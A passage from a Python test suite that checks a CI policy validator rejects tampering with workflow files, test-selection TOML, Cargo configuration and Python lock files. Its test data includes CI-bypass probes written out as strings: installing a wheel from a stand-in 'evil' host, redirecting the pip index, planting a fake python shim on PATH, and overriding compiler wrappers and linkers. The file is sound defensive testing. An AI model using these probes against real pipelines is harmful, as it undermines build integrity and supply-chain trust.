            'unproven skip': baseline.replace('proof = "loader-extended"\nmodes = ["server-unit", "server-race", "go-fuzz"]', 'proof = "nothing"\nmodes = ["server-unit", "server-race", "go-fuzz"]', 1),
            'unknown selected id': baseline + '\n[[selected]]\nid = "server-unit-shadow"\nmode = "console-vitest"\ncwd = "console"\ncommand = ["bash", "-c", "echo pwned > {report}"]\ntests = []\n',
            'extra skip allowance': baseline + '\n[[skips]]\npackage = "github.com/ricevanta/ricevanta/server/internal/signing/dsse"\ntest = "TestVerifyRejectsForgedSignature"\nreason = "x"\nproof = "server-race"\nmodes = ["server-unit"]\n',
            'removed skip allowance': baseline.replace('[[skips]]\npackage = "github.com/ricevanta/ricevanta/server/internal/extensions/loader"\ntest = "TestLoaderMeasurementChild"\nreason = "fresh measurement child entry point"\nproof = "loader-gate-b-extended"\nmodes = ["server-unit", "server-race", "go-fuzz"]\n', ''),
            'widened skip modes': baseline.replace('proof = "loader-gate-b-extended"\nmodes = ["server-unit", "server-race", "go-fuzz"]', 'proof = "loader-gate-b-extended"\nmodes = ["server-unit", "server-race", "go-fuzz", "ocsf-native"]', 1),
            'dropped interop children': baseline.replace('children = [\n  { parent = "TestRustWriterMutations", Helper = "TestRustWriterPrecondition", Pipe = "", Outcome = "rejected" },\n', 'children = [\n', 1),
            'dropped interop subtests': baseline.replace('subtests = ["TestRustWriterCaptureOverflow/stdout", "TestRustWriterCaptureOverflow/stderr"]', 'subtests = []', 1),
            'dropped interop prefixes': baseline.replace('subtest_prefixes = ["TestRustWriterFixtures/body/", "TestRustWriterFixtures/header/", "TestRustWriterFixtures/descriptor/"]', 'subtest_prefixes = []', 1),
            'dropped interop helper': baseline.replace('helpers = ["TestRustWriterPrecondition", "TestRustWriterCaptureChild"]', 'helpers = ["TestRustWriterPrecondition"]', 1),
            'dropped loader marker': baseline.replace('args = ["-loader-budget-extended"]\nmarker = "LOADER_MEASUREMENT"', 'args = ["-loader-budget-extended"]'),
            'dropped fuzz inventory cross-check': baseline.replace('packages = ["./..."]\nfuzz_inventory = true\n\n[[selected]]\nid = "server-race"', 'packages = ["./..."]\n\n[[selected]]\nid = "server-race"'),
            'extra fuzz flag': baseline.replace('[loader]\npackage = "./internal/extensions/loader"\ntarget = "FuzzParserQualification"\nfuzztime = "60s"',
                                                '[loader]\npackage = "./internal/extensions/loader"\ntarget = "FuzzParserQualification"\nfuzztime = "30s"'),
        }
        for label, mutated in mutations.items():
            with self.subTest(mutation=label):
                self.assertNotEqual(mutated, baseline)
                path.write_text(mutated)
                self.assertTrue(any(error.startswith('scripts/ci/targets.toml') for error in check_policy.check(self.root)), label)
        path.write_text(baseline)
        self.assertEqual(check_policy.check(self.root), [])

    def test_selected_rows_cannot_move_their_commands(self):
        self.assertEqual(set(check_policy.SELECTED_PLACES), set(check_policy.SELECTED_COMMANDS))
        path = self.root / 'scripts/ci/targets.toml'
        baseline = path.read_text()
        # Review probe: a fixture-looking module with the real import path replaces the benchmark.
        module = self.root / 'scripts/ci/fixtures/selected/benchdata'
        (module / 'internal/signing/ed25519key').mkdir(parents=True)
        (module / 'go.mod').write_text('module github.com/ricevanta/ricevanta/server\n\ngo 1.27\n')
        (module / 'internal/signing/ed25519key/fake_test.go').write_text(
            'package ed25519key\n\nimport "testing"\n\nfunc BenchmarkValidate(b *testing.B) {}\n')
        bench = 'id = "key-admission-bench"\nmode = "go-bench"\ncwd = "server"'
        mutations = {
            'nested fixture module': baseline.replace(bench, bench.replace('cwd = "server"', 'cwd = "scripts/ci/fixtures/selected/benchdata"')),
            'other top-level directory': baseline.replace(bench, bench.replace('cwd = "server"', 'cwd = "scripts"')),
            'agent directory': baseline.replace(bench, bench.replace('cwd = "server"', 'cwd = "agent"')),
            'parent directory': baseline.replace(bench, bench.replace('cwd = "server"', 'cwd = ".."')),
            'moved Rust properties': baseline.replace('id = "batch-extended"\nmode = "rust-selected"\ncwd = "agent"', 'id = "batch-extended"\nmode = "rust-selected"\ncwd = "scripts"'),
            'moved Gate B': baseline.replace('id = "loader-gate-b-extended"\nmode = "go-selected"\ncwd = "server"', 'id = "loader-gate-b-extended"\nmode = "go-selected"\ncwd = "console"'),
            'interop as plain selection': baseline.replace('id = "interop-unit"\nmode = "go-interop"', 'id = "interop-unit"\nmode = "go-selected"'),
        }
        for label, mutated in mutations.items():
            with self.subTest(mutation=label):
                self.assertNotEqual(mutated, baseline)
                path.write_text(mutated)
                self.assertTrue(any(error.startswith('scripts/ci/targets.toml') for error in check_policy.check(self.root)), label)
        path.write_text(baseline)
        self.assertEqual(check_policy.check(self.root), [])

    def test_go_sources_cannot_carry_test2json_framing(self):
        self.assertEqual(check_policy.framing_errors(ROOT), [])
        package = self.root / 'server/internal/forged'
        package.mkdir(parents=True)
        for label, text in (('raw byte', 'package forged\n\nconst frame = "\x16=== RUN"\n'),
                            ('hex escape', 'package forged\n\nconst frame = "\\x16"\n'),
                            ('unicode escape', 'package forged\n\nconst frame = "\\u0016"\n'),
                            ('long unicode escape', 'package forged\n\nconst frame = "\\U00000016"\n'),
                            ('octal escape', 'package forged\n\nconst frame = "\\026"\n')):
            for name in ('forged_test.go', 'forged.go'):
                with self.subTest(form=label, file=name):
                    (package / name).write_text(text)
                    self.assertTrue(any('framing byte' in error for error in check_policy.check(self.root)))
                    (package / name).unlink()
        (package / 'clean_test.go').write_text('package forged\n\nconst tls = 0x16\n')
        # Partial tripwire: testdata is not compiled into the test binary and stays allowed.
        (package / 'testdata').mkdir()
        (package / 'testdata/record.go').write_text('package testdata\n\nconst record = "\\x16\\x03\\x01"\n')
        self.assertEqual(check_policy.check(self.root), [])

    def test_cargo_configuration_and_overrides_are_rejected(self):
        self.assertEqual(check_policy.cargo_config_errors(ROOT), [])
        for relative in ('agent/.cargo/config.toml', '.cargo/config', 'agent/crates/batch/.cargo/config.toml'):
            path = self.root / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text("[target.'cfg(all())']\nrunner = 'tools/harness-runner'\n")
            with self.subTest(config=relative):
                self.assertTrue(any(relative + ': repository Cargo configuration' in error for error in check_policy.check(self.root)))
            path.unlink()
        self.assertEqual(check_policy.check(self.root), [])
        # Review probes include the fake linker and RUSTFLAGS; the allowlist closes every other name.
        for name in ('RUSTC_WRAPPER', 'CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER', 'CARGO_BUILD_RUSTC_WRAPPER',
                     'CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_LINKER', 'RUSTFLAGS', 'CARGO_ENCODED_RUSTFLAGS', 'RUSTDOCFLAGS',
                     'CARGO_TARGET_X86_64_PC_WINDOWS_MSVC_RUSTFLAGS', 'RUSTUP_TOOLCHAIN', 'CARGO_BUILD_TARGET', 'rustflags'):
            with self.subTest(env=name):
                self.mutate('agent', lambda data: data['jobs']['validate'].setdefault('env', {}).update({name: '${{ github.workspace }}/agent/tools/link'}))
                self.assertTrue(any('unreviewed Cargo or rustc variable' in error for error in check_policy.check(self.root)))
                shutil.copytree(ROOT / '.github', self.root / '.github', dirs_exist_ok=True)
            with self.subTest(github_env=name):
                def write_env(data, name=name):
                    step = next(s for s in data['jobs']['validate']['steps'] if 'run' in s)
                    step['run'] = 'echo "%s=-Clinker=$GITHUB_WORKSPACE/agent/tools/link" >> "$GITHUB_ENV"\n' % name + step['run']
                self.mutate('agent', write_env)
                self.assertTrue(any('unreviewed Cargo or rustc variable' in error for error in check_policy.check(self.root)))
                shutil.copytree(ROOT / '.github', self.root / '.github', dirs_exist_ok=True)
        for name in sorted(check_policy.rust_env.WORKFLOW_RUST_ENV):
            with self.subTest(allowed=name):
                self.mutate('agent', lambda data: data['jobs']['validate'].setdefault('env', {}).update({name: '1'}))
                self.assertFalse(any('Cargo or rustc variable' in error for error in check_policy.check(self.root)))
                shutil.copytree(ROOT / '.github', self.root / '.github', dirs_exist_ok=True)
        self.assertEqual(check_policy.check(self.root), [])

    def test_c_toolchain_runner_and_path_settings_are_rejected(self):
        """Design sections 6 and 8 and review R-23: C toolchain names, LD, Go environment files, RUNNER_* and
        GITHUB_PATH writes by any spelling, in every job; GITHUB_ENV writes only as literal reviewed names."""
        self.assertEqual(check_policy.check(self.root), [])
        def steps(data, jid): return data['jobs'][jid]['steps']
        def insert(jid, step, at=5): return lambda d: steps(d, jid).insert(at, step)
        def env_at(scope, jid, key, value='x'):
            def change(data):
                target = data if scope == 'workflow' else data['jobs'][jid] if scope == 'job' else next(s for s in steps(data, jid) if 'run_selected.py' in s.get('run', ''))
                target.setdefault('env', {})[key] = value
            return change
        mutations = []
        for name in ('CC', 'cc', 'CXX', 'AR', 'CFLAGS', 'CFLAGS_x86_64_unknown_linux_gnu', 'CC_x86_64-unknown-linux-gnu', 'TARGET_CXX',
                     'HOST_CC', 'SDKROOT', 'MACOSX_DEPLOYMENT_TARGET', 'CROSS_COMPILE', 'CRATE_CC_NO_DEFAULTS', 'VCINSTALLDIR', 'CGO_LDFLAGS',
                     'CGO_CFLAGS'):
            for scope in ('workflow', 'job', 'step'):
                mutations.append(('agent', f'{scope} {name}', env_at(scope, 'validate', name), 'C toolchain variable'))
            mutations.append(('server', f'GITHUB_ENV {name}', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': f'echo "{name}=/tmp/x" >> "$GITHUB_ENV"'}), 'C toolchain variable'))
        mutations += [
            ('server', 'race CC through step env', env_at('step', 'race', 'CC', '/tmp/cc'), 'C toolchain variable'),
            ('agent', 'LD job env', env_at('job', 'validate', 'LD', '/tmp/ld'), 'admitted tool environment override forbidden: LD'),
            ('server', 'GOTOOLDIR job env', env_at('job', 'validate', 'GOTOOLDIR', '/tmp/tools'), 'admitted tool environment override forbidden: GOTOOLDIR'),
            ('server', 'GOENV job env', env_at('job', 'validate', 'GOENV', '/tmp/go.env'), 'compiler cache environment override forbidden'),
            ('server', 'GOENV through GITHUB_ENV', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': 'echo "GOENV=/tmp/go.env" >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
            ('server', 'RUNNER_TEMP job env', env_at('job', 'validate', 'RUNNER_TEMP', '/tmp/elsewhere'), 'admitted tool environment override forbidden: RUNNER_TEMP'),
            ('agent', 'RUNNER_ENVIRONMENT workflow env', env_at('workflow', 'validate', 'RUNNER_ENVIRONMENT', 'github-hosted'), 'admitted tool environment override forbidden: RUNNER_ENVIRONMENT'),
            ('server', 'RUNNER_TOOL_CACHE through GITHUB_ENV', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': 'echo "RUNNER_TOOL_CACHE=/tmp/c" >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
            ('agent', 'RUSTUP_HOME through GITHUB_ENV', insert('validate', {'shell': python_env.ADMISSION_SHELL, 'run': 'echo "RUSTUP_HOME=/tmp/r" >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
            # GITHUB_PATH by context in jobs that consume no Python closure.
            ('server', 'github.path in a Go job', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': 'echo "$RUNNER_TEMP/shim" >> "${{ github.path }}"'}), 'PATH changes outside the admitted bootstrap'),
            ('agent', 'runner add_path file in a Rust job', insert('validate', {'shell': python_env.ADMISSION_SHELL, 'run': 'echo "$RUNNER_TEMP/shim" >> "$RUNNER_TEMP"/_runner_file_commands/add_path_x'}), 'PATH changes outside the admitted bootstrap'),
            ('agent', 'github.path through step env', insert('validate', {'shell': python_env.ADMISSION_SHELL, 'env': {'P': '${{ github.path }}'}, 'run': 'echo "$RUNNER_TEMP/shim" >> "$P"'}), 'PATH changes outside the admitted bootstrap'),
            # N-04r: names built at run time cannot be reviewed.
            ('server', 'variable-built GOROOT', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': 'n=GO; echo "${n}ROOT=/opt/go" >> "$GITHUB_ENV"'}), 'environment file writes must be literal'),
            ('server', 'printf-built name', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': 'printf "%sROOT=/opt/go\\n" GO >> "$GITHUB_ENV"'}), 'environment file writes must be literal'),
            ('server', 'Python-built GOROOT', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': "python3 -c \"import os; open(os.environ['GITHUB_ENV'], 'a').write('GO' + 'ROOT=/opt/go\\n')\""}), 'environment file writes must be literal'),
            ('server', 'github.env context', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': 'echo "GOFLAGS=-mod=mod" >> "${{ github.env }}"'}), 'environment file writes must be literal'),
            ('server', 'heredoc block write', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': '{\n  echo "A=1"\n} >> "$GITHUB_ENV"'}), 'environment file writes must be literal'),
            # Section 8: every job's CI_TOOLS is pinned, not merely a superset of what it runs.
            ('server', 'extra tool selected', lambda d: next(s for s in steps(d, 'validate') if s.get('run') == check_policy.BOOTSTRAP_COMMAND)['env'].update(CI_TOOLS='python,go,rust'),
             'CI_TOOLS differs from the reviewed selection'),
            ('agent', 'interop without go pin', lambda d: [s['env'].update(CI_TOOLS='python,go,rust,node') for s in steps(d, 'rustinterop')
                                                          if s.get('run') in (check_policy.BOOTSTRAP_COMMAND, check_policy.EVIDENCE_COMMAND)],
             'CI_TOOLS differs from the reviewed selection'),
        ]
        for workflow, label, change, expected in mutations:
            with self.subTest(mutation=label):
                self.mutate(workflow, change)
                errors = check_policy.check(self.root)
                shutil.copyfile(ROOT / f'.github/workflows/{workflow}.yml', self.root / f'.github/workflows/{workflow}.yml')
                self.assertTrue(any(expected in error for error in errors), (label, errors))
        self.assertEqual(check_policy.check(self.root), [])
        # Admitted: the cc logging switch, a literal reviewed GITHUB_ENV name and prose naming clients.
        for workflow, label, change in (
                ('agent', 'CC_ENABLE_DEBUG_OUTPUT', env_at('job', 'validate', 'CC_ENABLE_DEBUG_OUTPUT', '1')),
                ('server', 'literal reviewed GITHUB_ENV name', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': 'echo "RICEVANTA_FLAG=$RUNNER_TEMP/x" >> "$GITHUB_ENV"'})),
                ('server', 'prose naming HTTP clients', insert('fuzz', {'shell': python_env.ADMISSION_SHELL, 'run': 'echo "The console calls fetch() through HttpClient and WebClient wrappers"'}))):
            with self.subTest(admitted=label):
                self.mutate(workflow, change)
                errors = check_policy.check(self.root)
                shutil.copyfile(ROOT / f'.github/workflows/{workflow}.yml', self.root / f'.github/workflows/{workflow}.yml')
                self.assertEqual(errors, [], label)

    def test_ci_contracts_format_and_vet_the_declaration_helper(self):
        self.assertEqual(inventory.checks('ci-contracts'), ['ci-go-helper', 'ci-unit', 'ci-policy'])
        def step(data):
            return next(s for s in data['jobs']['ci-contracts']['steps'] if 'go vet .' in s.get('run', ''))
        mutations = {
            'other directory': lambda data: step(data).update({'working-directory': 'server'}),
            'conditional': lambda data: step(data).update({'if': 'false'}),
            'no vet': lambda data: step(data).update({'run': step(data)['run'].replace('go vet .', 'true')}),
            'no format check': lambda data: step(data).update({'run': step(data)['run'].replace('gofmt -l .', 'true')}),
            'removed': lambda data: data['jobs']['ci-contracts']['steps'].remove(step(data)),
            'no fresh Go caches': lambda data: data['jobs']['ci-contracts']['steps'].remove(
                next(s for s in data['jobs']['ci-contracts']['steps'] if s.get('name') == 'Create fresh Go caches')),
        }
        for label, change in mutations.items():
            with self.subTest(mutation=label):
                self.mutate('ci', change)
                self.assertNotEqual(check_policy.check(self.root), [])
                shutil.copytree(ROOT / '.github', self.root / '.github', dirs_exist_ok=True)
        self.assertEqual(check_policy.check(self.root), [])

    def test_wrapper_steps_are_classified_from_the_checked_root(self):
        self.assertEqual(check_policy.wrapper_toolchain(check_policy.wrapper('agent-unit'), self.root), 'cargo')
        self.assertEqual(check_policy.wrapper_toolchain(check_policy.wrapper('server-race'), self.root), 'go')
        self.assertEqual(check_policy.wrapper_toolchain(check_policy.FUZZ_WRAPPER, self.root), 'go')
        self.assertEqual(check_policy.wrapper_toolchain(check_policy.wrapper('mystery'), self.root), 'unknown')
        self.assertIsNone(check_policy.wrapper_toolchain('echo fuzz', self.root))
        self.assertEqual(check_policy.wrapper_id('echo fuzz --id'), None)
        self.assertEqual(check_policy.wrapper_id(check_policy.FUZZ_WRAPPER), 'go-fuzz:${FUZZ_PACKAGE}:${FUZZ_TARGET}')
        path = self.root / 'scripts/ci/targets.toml'
        baseline = path.read_text()
        path.write_text(baseline.replace('id = "agent-unit"\nmode = "rust-suite"', 'id = "agent-unit"\nmode = "go-suite"'))
        self.assertEqual(check_policy.wrapper_toolchain(check_policy.wrapper('agent-unit'), self.root), 'go')
        path.write_text(baseline)

    def test_receipts_bind_verified_selected_evidence(self):
        for workflow, jid in (('server', 'validate'), ('server', 'race'), ('server', 'fuzz'), ('server', 'loader-gate-a'),
                              ('server', 'loader-gate-b'), ('server', 'ocsf-native'), ('agent', 'validate'), ('agent', 'rustinterop')):
            with self.subTest(workflow=workflow, job=jid):
                def change(data):
                    proof = next(s for s in data['jobs'][jid]['steps'] if s.get('id') == 'proof')
                    expected = check_policy.AGENT_RECEIPT if workflow == 'agent' and jid == 'validate' else check_policy.RECEIPT_WITH_EVIDENCE
                    self.assertIn(expected, proof['run'])
                    proof['run'] = proof['run'].replace(expected, "required.receipt(route, unit, json.loads(os.environ['CHECKS']))")
                self.mutate(workflow, change)
                self.assertTrue(any('receipt must bind verified selected-run evidence' in error for error in check_policy.check(self.root)))
                shutil.copyfile(ROOT / f'.github/workflows/{workflow}.yml', self.root / f'.github/workflows/{workflow}.yml')
        for workflow, jid, raw in (('server', 'race', 'go test -race -count=1 -timeout=15m ./...'),
                                   ('server', 'validate', 'go test -count=1 ./...'),
                                   ('agent', 'validate', 'cargo test --locked --workspace'),
                                   ('agent', 'rustinterop', "go test -v -tags rustinterop ./internal/events/body -run '^TestRustWriter' -count=1")):
            with self.subTest(workflow=workflow, job=jid, raw=raw):
                def change(data, jid=jid, raw=raw):
                    for step in data['jobs'][jid]['steps']:
                        if 'run_selected.py' in step.get('run', ''):
                            step['run'] = raw
                            break
                self.mutate(workflow, change)
                self.assertTrue(check_policy.check(self.root))
                shutil.copyfile(ROOT / f'.github/workflows/{workflow}.yml', self.root / f'.github/workflows/{workflow}.yml')

    def test_fuzz_corpus_and_failure_propagation_controls(self):
        self.assertEqual(check_policy.check(self.root), [])
        path = self.root / '.github/workflows/server.yml'
        baseline = yaml.load(path.read_text(), Loader=yaml.BaseLoader)
        for jid in ('fuzz', 'loader-gate-a'):
            for mutation in ('removed corpus', 'wrong corpus', 'conditional corpus', 'hidden failure'):
                with self.subTest(job=jid, mutation=mutation):
                    data = deepcopy(baseline)
                    job = data['jobs'][jid]
                    corpus = next(s for s in job['steps'] if s.get('name') == 'Upload failing corpus')
                    if mutation == 'removed corpus': job['steps'].remove(corpus)
                    elif mutation == 'wrong corpus': corpus['with']['path'] = 'missing/**'
                    elif mutation == 'conditional corpus': corpus['if'] = 'success()'
                    else:
                        step = next(s for s in job['steps'] if check_policy.FUZZ_WRAPPER in s.get('run', '')
                                    or check_policy.wrapper('loader-fuzz') in s.get('run', ''))
                        step['run'] += ' || true'
                    path.write_text(yaml.safe_dump(data, sort_keys=False))
                    self.assertTrue(check_policy.check(self.root))
        path.write_text(yaml.safe_dump(baseline, sort_keys=False))

    def test_each_design_consumer_is_required(self):
        for command in check_policy.DESIGN_COMMANDS:
            with self.subTest(command=command):
                def change(data):
                    for step in data['jobs']['validate']['steps']:
                        if command in step.get('run', ''):
                            step['run'] = step['run'].replace(command, 'removed-consumer')
                self.mutate('design', change)
                self.assertTrue(check_policy.check(self.root))
                shutil.copyfile(ROOT / '.github/workflows/design.yml', self.root / '.github/workflows/design.yml')

    def test_each_required_command_cannot_be_removed(self):
        for (name, jid), commands in check_policy.COMMANDS.items():
            for command in commands:
                with self.subTest(workflow=name, job=jid, command=command):
                    def change(data):
                        for step in data['jobs'][jid]['steps']:
                            if command in step.get('run', ''):
                                step['run'] = step['run'].replace(command, 'removed-command')
                    self.mutate(name, change)
                    self.assertTrue(check_policy.check(self.root))
                    shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')

    def test_python_closure_mutations_are_rejected(self):
        import python_env
        self.assertEqual(check_policy.check(self.root), [])
        def admitted(data, jid='validate'):
            return next(s for s in data['jobs'][jid]['steps'] if s.get('run') == check_policy.BOOTSTRAP_COMMAND)
        setup_python = {'uses': 'actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97',
                        'with': {'python-version-file': '.github/python-version'}}
        def step(data, run, jid='validate'):
            return next(s for s in data['jobs'][jid]['steps'] if s.get('run') == run)
        def swap_install_after_validator(data):
            steps = data['jobs']['validate']['steps']
            install = step(data, python_env.INSTALL_COMMAND)
            steps.remove(install)
            steps.insert(next(i for i, s in enumerate(steps) if 'schema_test.py' in s.get('run', '')) + 1, install)
        unhashed = 'python -m pip install --disable-pip-version-check -r .github/requirements-design.txt'
        mutations = [
            ('design', 'setup action', lambda d: d['jobs']['validate']['steps'].insert(1, dict(setup_python)), 'unchecked setup action'),
            ('design', 'bootstrap without python', lambda d: admitted(d)['env'].update(CI_TOOLS='go'), 'bootstrap tools omit python'),
            ('design', 'tools from PR text', lambda d: admitted(d)['env'].update(CI_TOOLS='${{ github.event.pull_request.title }}'), 'CI_TOOLS must be a literal'),
            ('design', 'unhashed install', lambda d: step(d, python_env.INSTALL_COMMAND).update(run=unhashed), 'ad hoc Python environment or package installation forbidden'),
            ('design', 'source fallback', lambda d: step(d, python_env.INSTALL_COMMAND).update(run=python_env.INSTALL_COMMAND.replace(' --only-binary=:all:', '')), 'ad hoc Python environment'),
            ('design', 'skipped check', lambda d: step(d, python_env.INSTALL_COMMAND).update(run=python_env.INSTALL_COMMAND.replace(python_env.CHECK_COMMAND + '\n', '')), 'ad hoc Python environment'),
            ('design', 'missing venv', lambda d: d['jobs']['validate']['steps'].remove(step(d, python_env.VENV_COMMAND)), 'one fresh venv and one hash-locked install in order'),
            ('design', 'conditional install', lambda d: step(d, python_env.INSTALL_COMMAND).update({'if': 'false'}), 'closure admission steps must be unconditional'),
            ('design', 'hidden install failure', lambda d: step(d, python_env.INSTALL_COMMAND).update({'continue-on-error': 'true'}), 'closure admission steps must be unconditional'),
            ('design', 'install after validator', swap_install_after_validator, 'validator runs before the hash-locked closure is admitted'),
            ('design', 'duplicate environment', lambda d: d['jobs']['validate']['steps'].insert(3, {'run': 'python -m venv "$RUNNER_TEMP/other"'}), 'ad hoc Python environment'),
            ('server', 'ad hoc jsonschema', lambda d: d['jobs']['validate']['steps'].insert(2, {'run': 'python -m pip install jsonschema==4.25.1'}), 'ad hoc Python environment'),
            ('server', 'validator without closure', lambda d: d['jobs']['validate']['steps'].insert(3, {'run': 'python schemas/export/v1alpha1/validate.py'}), 'closure consumer requires the admitted bootstrap'),
            ('agent', 'divergent agent Python', lambda d: admitted(d)['env'].update(CI_TOOLS='rust'), 'bootstrap tools omit python'),
            ('copilot-code-review', 'Copilot setup action', lambda d: d['jobs']['copilot-setup-steps']['steps'].insert(1, dict(setup_python)), 'unchecked setup action'),
            ('copilot-code-review', 'Copilot unhashed install', lambda d: step(d, python_env.INSTALL_COMMAND, 'copilot-setup-steps').update(run=unhashed), 'ad hoc Python environment'),
        ]
        for name, label, change, expected in mutations:
            with self.subTest(mutation=label):
                self.mutate(name, change)
                self.assertTrue(any(expected in error for error in check_policy.check(self.root)),
                                (label, check_policy.check(self.root)))
                shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')
        self.assertEqual(check_policy.check(self.root), [])
        # Fixtures are written as bytes: text-mode writes become CRLF on Windows and the lock readers are LF-strict.
        requirements = self.root / python_env.REQUIREMENTS
        baseline = python_env.read_exact(requirements)
        six_hash = next(line for line in baseline.splitlines() if line.startswith('# wheel six-')).rsplit(':', 1)[1]
        for label, text in (('unhashed pin', baseline.replace(' \\\n    --hash=sha256:3fba0169e345c7175110351d456342c364814cfcf3b964ba4587f22915230a63', '')),
                            ('floating pin', baseline.replace('jsonschema==4.25.1', 'jsonschema>=4.25.1')),
                            ('extra package', baseline + 'requests==2.32.5 \\\n    --hash=sha256:' + 'c' * 64 + '\n'),
                            ('extra hash without a recorded wheel', baseline.replace(
                                f'six==1.17.0 \\\n    --hash=sha256:{six_hash}\n',
                                f'six==1.17.0 \\\n    --hash=sha256:{six_hash} \\\n    --hash=sha256:{"d" * 64}\n')),
                            ('previous unhashed lock', 'jsonschema==4.25.1\nPyYAML==6.0.3\nrfc3339-validator==0.1.4\nsix==1.17.0\nattrs==26.1.0\n'
                             'jsonschema-specifications==2025.9.1\nreferencing==0.37.0\nrpds-py==2026.6.3\ntyping-extensions==4.16.0\n'),
                            ('url requirement', baseline.replace('six==1.17.0', 'six @ https://example.invalid/six-1.17.0-py2.py3-none-any.whl'))):
            with self.subTest(lock=label):
                self.assertNotEqual(text, baseline)
                requirements.write_bytes(text.encode('utf-8'))
                self.assertTrue(any(python_env.REQUIREMENTS in e for e in check_policy.check(self.root)), label)
        requirements.write_bytes(baseline.encode('utf-8'))
        version = self.root / python_env.PYTHON_VERSION_FILE
        for text in ('3.14\n', '3.14.8', '3.14.8\r\n', '3.14.x\n'):
            with self.subTest(python=text):
                version.write_bytes(text.encode('utf-8'))
                self.assertTrue(any(python_env.PYTHON_VERSION_FILE in e for e in check_policy.check(self.root)))
        version.write_bytes(b'3.14.8\n')
        licensing = self.root / python_env.LICENSING
        rows = python_env.read_exact(licensing)
        row = next(line for line in rows.splitlines() if line.startswith('| Python [`attrs`]'))
        licensing.write_bytes(rows.replace(row + '\n', '').encode('utf-8'))
        self.assertTrue(any('attrs 26.1.0: no licensing row' in e for e in check_policy.check(self.root)))
        licensing.write_bytes(rows.encode('utf-8'))
        self.assertEqual(check_policy.check(self.root), [])

    def test_closure_bypass_probes_are_rejected(self):
        """Every probe the adversarial review found accepted must now fail, plus the re-check placement rules."""
        import python_env
        self.assertEqual(check_policy.check(self.root), [])
        def steps(data, jid='validate'): return data['jobs'][jid]['steps']
        def index(data, run, jid='validate'): return next(i for i, s in enumerate(steps(data, jid)) if s.get('run') == run)
        def after_install(data, run):
            steps(data).insert(index(data, python_env.INSTALL_COMMAND) + 1, {'run': run})
        probes = (
            'python -m pip -q install --no-deps https://example.invalid/evil.whl',
            'python -m pip --isolated install requests',
            'python -m pip --disable-pip-version-check install requests',
            'python -m pip.__main__ install requests',
            'python -c "import pip; pip.main([\'install\', \'requests\'])"',
            'python -B -m venv "$RUNNER_TEMP/other"',
            'python -Im venv "$RUNNER_TEMP/other"',
            'python -I -m ensurepip',
            'pip3 install requests', 'pipx install ruff', 'pipenv install requests', 'poetry install', 'conda install requests',
            'uvx ruff check .', 'uv run --with requests python -c 1', 'uv add requests', 'uv pip install requests',
            'pdm add requests', 'hatch env create', 'rye sync', 'pixi install', 'mamba install requests', 'micromamba install requests',
            'python scripts/ci/python_env.py --path-out "$GITHUB_PATH" --venv "$RUNNER_TEMP/v2"',
            'python  -B scripts/ci/python_env.py --venv "$RUNNER_TEMP/v2" --path-out "$GITHUB_PATH"',
            'mkdir -p "$RUNNER_TEMP/shim" && printf \'#!/bin/sh\\nexit 0\\n\' > "$RUNNER_TEMP/shim/python" && chmod +x "$RUNNER_TEMP/shim/python" && echo "$RUNNER_TEMP/shim" >> "$GITHUB_PATH"',
            'echo "$RUNNER_TEMP/other/bin" >> "$GITHUB_PATH"',
            'echo "PYTHONPATH=$PWD/vendor" >> "$GITHUB_ENV"',
            'echo "PIP_INDEX_URL=https://mirror.example.invalid/simple" >> "$GITHUB_ENV"',
            'python - <<\'PY\'\nimport os\nopen(os.environ["GITHUB_ENV"], "a").write("PYTHONPATH=vendor\\n")\nPY\n',
        )
        for probe in probes:
            with self.subTest(probe=probe):
                self.mutate('design', lambda d, probe=probe: after_install(d, probe))
                self.assertTrue(check_policy.check(self.root), probe)
                shutil.copyfile(ROOT / '.github/workflows/design.yml', self.root / '.github/workflows/design.yml')
        def env_at(scope, key):
            def change(data):
                target = (data if scope == 'workflow' else data['jobs']['validate'] if scope == 'job'
                          else steps(data)[index(data, python_env.INSTALL_COMMAND)])
                target.setdefault('env', {})[key] = 'vendor'
            return change
        def second_setup(data):
            bootstrap = next(s for s in steps(data) if s.get('run') == check_policy.BOOTSTRAP_COMMAND)
            steps(data).insert(index(data, python_env.INSTALL_COMMAND) + 1, deepcopy(bootstrap))
        def remove_check(data): steps(data).pop(index(data, python_env.CHECK_COMMAND))
        def early_check(data):
            check = steps(data).pop(index(data, python_env.CHECK_COMMAND))
            steps(data).insert(index(data, python_env.INSTALL_COMMAND) + 1, check)
        def python_after_check(data):
            steps(data).insert(index(data, python_env.CHECK_COMMAND) + 1, {'run': 'python -c "print(1)"'})
        def conditional_check(data): steps(data)[index(data, python_env.CHECK_COMMAND)]['if'] = 'always()'
        def install_without_check(data):
            steps(data)[index(data, python_env.INSTALL_COMMAND)]['run'] = python_env.INSTALL_COMMAND.replace(python_env.CHECK_COMMAND + '\n', '')
        mutations = [('design', f'{scope} {key}', env_at(scope, key))
                     for scope in ('workflow', 'job', 'step')
                     for key in ('PYTHONPATH', 'PYTHONHOME', 'PIP_INDEX_URL', 'PIP_EXTRA_INDEX_URL', 'PYTHONUSERBASE')]
        mutations += [('design', 'second setup-python after install', second_setup),
                      ('design', 're-check removed', remove_check),
                      ('design', 're-check before validators', early_check),
                      ('design', 'python after re-check', python_after_check),
                      ('design', 'conditional re-check', conditional_check),
                      ('design', 'install without inline check', install_without_check),
                      ('ci', 're-check removed from aggregate', lambda d: steps(d, 'ci-required').pop(index(d, python_env.CHECK_COMMAND, 'ci-required'))),
